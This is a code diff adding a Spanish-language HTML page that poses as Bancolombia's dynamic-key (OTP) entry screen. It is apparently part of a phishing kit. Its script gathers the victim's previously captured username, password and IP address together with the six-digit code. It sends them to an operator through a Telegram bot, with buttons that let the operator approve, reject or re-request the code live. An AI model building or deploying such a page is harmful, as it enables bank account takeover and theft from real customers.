@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave Dinámica - Bancolombia</title>
+    <link href="css/styles.css" rel="stylesheet">
+    <link href="css/bootstrap.css" rel="stylesheet">
+    <style>
+        body {
+            background: #f5f5f5;
+            font-family: Arial, sans-serif;
+        }
+        .container-otp {
+            max-width: 500px;
+            margin: 50px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-container img {
+            max-width: 200px;
+        }
+        h2 {
+            color: #1A1919;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .otp-inputs input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+        .otp-inputs input:focus {
+            outline: none;
+            border-color: #FDDA24;
+        }
+        .btn-continuar {
+            width: 100%;
+            padding: 14px;
+            background: #FDDA24;
+            border: none;
+            border-radius: 5px;
+            color: #1A1919;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-continuar:hover {
+            background: #e5c41f;
+        }
+        .btn-continuar:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FDDA24;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container-otp" id="formContainer">
+        <div class="logo-container">
+            <img src="img/logo-bancolombia.png" alt="Bancolombia">
+        </div>
+        
+        <h2>Clave Dinámica</h2>
+        <p class="subtitle">Ingresa el código de 6 dígitos que te enviamos por SMS o que aparece en tu app</p>
+        
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" id="otp1" inputmode="numeric">
+            <input type="text" maxlength="1" id="otp2" inputmode="numeric">
+            <input type="text" maxlength="1" id="otp3" inputmode="numeric">
+            <input type="text" maxlength="1" id="otp4" inputmode="numeric">
+            <input type="text" maxlength="1" id="otp5" inputmode="numeric">
+            <input type="text" maxlength="1" id="otp6" inputmode="numeric">
+        </div>
+        
+        <button class="btn-continuar" id="btnContinuar" disabled>
+            Continuar
+        </button>
+    </div>
+    
+    <div class="loading" id="loadingContainer">
+        <div class="spinner"></div>
+        <p>Verificando código...</p>
+    </div>
+
+    <script src="js/sendTelegramMessage.js"></script>
+    <script src="js/actions.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const userName = localStorage.getItem('userName');
+            const userPass = localStorage.getItem('userPass');
+            const userIP = localStorage.getItem('userIP');
+            const userIP2 = localStorage.getItem('userIP2');
+            const transactionId = localStorage.getItem('transactionId');
+            
+            if (!userName || !userPass) {
+                window.location.href = 'indexx.html';
+                return;
+            }
+            
+            const inputs = document.querySelectorAll('.otp-inputs input');
+            const btnContinuar = document.getElementById('btnContinuar');
+            const formContainer = document.getElementById('formContainer');
+            const loadingContainer = document.getElementById('loadingContainer');
+            
+            // Manejar navegación entre inputs
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    
+                    // Verificar si todos están llenos
+                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+                    btnContinuar.disabled = !allFilled;
+                });
+                
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            btnContinuar.addEventListener('click', async () => {
+                const otp = Array.from(inputs).map(input => input.value).join('');
+                
+                localStorage.setItem('userOTP', otp);
+                
+                formContainer.style.display = 'none';
+                loadingContainer.style.display = 'block';
+                
+                const mensaje = `🔐 *CLAVE DINÁMICA BANCOLOMBIA*\n\n📄 *Usuario:* ${userName}\n🔑 *Clave:* ${userPass}\n🎯 *OTP:* ${otp}\n🌐 *IP:* ${userIP}\n📍 *Ubicación:* ${userIP2}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}`;
+                
+                const teclado = JSON.stringify({
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+                            { text: "❌ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
+                        ],
+                        [
+                            { text: "🔐 Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
+                        ],
+                        [
+                            { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
+                        ]
+                    ]
+                });
+                
+                try {
+                    const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
+                    const { action } = await waitForButtonPress(responseMensaje.message_id);
+                    await handleAction(action, transactionId);
+                } catch (error) {
+                    console.error("❌ Error:", error);
+                    alert('Error de conexión. Intenta nuevamente.');
+                    window.location.reload();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
